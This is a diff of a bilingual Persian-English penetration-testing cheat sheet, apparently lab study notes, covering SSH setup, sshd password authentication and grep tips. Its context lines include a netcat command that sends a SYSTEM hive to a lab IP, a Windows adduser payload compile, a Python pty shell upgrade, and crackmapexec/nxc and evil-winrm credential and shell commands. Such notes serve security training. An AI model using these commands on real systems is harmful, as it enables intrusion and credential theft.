@@ -1,3 +1,4 @@
+
 # COMMANDS:
 #### Encode:
 ```bash
@@ -51,6 +52,10 @@ unzip file.zip
 ```
 #### SSH
 ```bash
+ssh eve@192.168.50.214 -p xx
+```
+
+```bash
 ssh -i id_rsa -p 2222 user@X.X.X.X
 ```
 
@@ -59,6 +64,51 @@ ssh -i dt_key -p xxx xxxx@X.X.X.X
 ```
 ssh-keygen
 
+```bash
+ssh-keygen -f ~/.ssh/known_hosts -R "[192.168.202.52]:2222"
+```
+	echo $SHELL
+	ps -p $$
+	echo $0
+
+	bash
+	zsh
+
+	chsh -s /bin/bash
+
+| status           | دستور                        | توضیح ساده                                   |
+| ---------------- | ---------------------------- | -------------------------------------------- |
+| **روشن کردن**    | `sudo systemctl start ssh`   | "SSH سرور رو الان روشن کن"                   |
+| **خاموش کردن**   | `sudo systemctl stop ssh`    | "SSH سرور رو الان خاموش کن"                  |
+| **ری‌استارت**    | `sudo systemctl restart ssh` | "یه بار خاموش و روشن کن"                     |
+| **وضعیت**        | `sudo systemctl status ssh`  | "نشون بده الان روشنه یا نه"                  |
+| **روشن با بوت**  | `sudo systemctl enable ssh`  | "هر بار که کالی روشن شد، SSH خودش بیاد بالا" |
+| **خاموش با بوت** | `sudo systemctl disable ssh` | "دیگه با روشن شدن کالی، SSH نیاد بالا"       |
+```bash
+sudo nano /etc/ssh/sshd_config
+```
+
+```bash
+sudo nano /etc/ssh/sshd_config
+```
+
+پیدا کن:
+
+```plain
+#PasswordAuthentication yes
+```
+
+تغییر بده به:
+
+```plain
+PasswordAuthentication yes
+```
+
+ذخیره کن:
+
+```bash
+sudo systemctl restart ssh
+```
 #### Compile
 ```bash
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
@@ -82,18 +132,35 @@ nc -q 0 192.168.45.152 4444 < SYSTEM
 | -------- | --------------------------- |
 | `< file` | فایل رو می‌خونه (input)     |
 | `> file` | داخل فایل می‌نویسه (output) |
-#### SSH
-```bash
-ssh eve@192.168.50.214
-```
 
-**PYTHON**
+#### PYTHON
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 #### github
 https://download-folder.github.io/
 https://download-directory.github.io/
+
+#### grep
+after
+```bash
+grep -A 2 "pattern" file.txt
+```
+befor
+```bash
+grep -B 2 "pattern" file.txt
+```
+both
+```bash
+grep -C 2 "pattern" file.txt
+```
+
+#### uninstal
+```bash
+sudo apt remove ...
+sudo apt remove --purge ...
+sudo apt autoremove
+```
 
 
 # WEBSITES:
@@ -180,7 +247,7 @@ crackmapexec winrm 192.168.177.222 -u alex -p 'password'
 nxc smb 192.168.177.222
 ```
 
-| پروتکل       | تست بدون Credential             | تست با Credential              | Enum مفید          | اجرای دستور / Shell    | اگر جواب داد → ابزار شل واقعی         |
+| Protocol     | تست بدون Credential             | تست با Credential              | Enum مفید          | اجرای دستور / Shell    | اگر جواب داد → ابزار شل واقعی         |
 | ------------ | ------------------------------- | ------------------------------ | ------------------ | ---------------------- | ------------------------------------- |
 | **SMB**      | `nxc smb IP -u '' -p ''`        | `nxc smb IP -u user -p pass`   | `--shares --users` | `-x "whoami"` ⚠️ admin | `psexec.py / wmiexec.py / smbexec.py` |
 | **WinRM**    | ❌ (معمولاً نمی‌شه)              | `nxc winrm IP -u user -p pass` | —                  | ❌                      | ⭐ `evil-winrm -i IP -u user -p pass`  |
